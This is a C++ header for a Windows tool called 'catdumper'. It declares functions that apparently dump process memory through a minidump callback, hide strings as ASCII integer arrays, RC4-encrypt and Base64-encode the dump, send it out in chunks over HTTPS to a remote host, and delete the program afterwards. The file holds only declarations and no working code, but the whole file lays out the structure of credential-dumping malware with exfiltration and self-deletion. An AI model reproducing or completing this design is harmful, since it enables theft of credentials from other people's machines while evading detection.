#ifndef catdumper
#define catdumper

#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <string>
#include <random>
#include <vector>
#include <cctype>
#include <limits>
#include <ctime>
#include <cstdlib>
#include <TlHelp32.h>
#include <processsnapshot.h>

extern LPVOID dumpBuffer;
extern DWORD bytesRead;

BOOL CALLBACK minidumpCallback(
    PVOID callbackParam,
    const PMINIDUMP_CALLBACK_INPUT callbackInput,
    PMINIDUMP_CALLBACK_OUTPUT callbackOutput
);

std::wstring ASCIItoWString(const std::vector<int>& asciiValues);
std::string ASCIItoString(const std::vector<int>& asciiValues);

constexpr unsigned int numRNG();
std::string Keygen(int length);
std::string EncryptDump(LPVOID dumpBuffer, DWORD dumpBufferSize, const std::string& key);
void RC4(std::vector<char>& data, const std::string& key);
std::string Base64Encode(const std::string& input);

std::vector<std::string> SplitDataIntoChunks(const std::string& data, size_t chunkSize);
bool SendHTTPSRequest(const std::string& hostname, const std::string& path, const std::string& data, bool isKey = false);
void SendDataInChunks(const std::vector<std::string>& chunks, const std::string& hostname, const std::string& path);

void SelfDelete();

#endif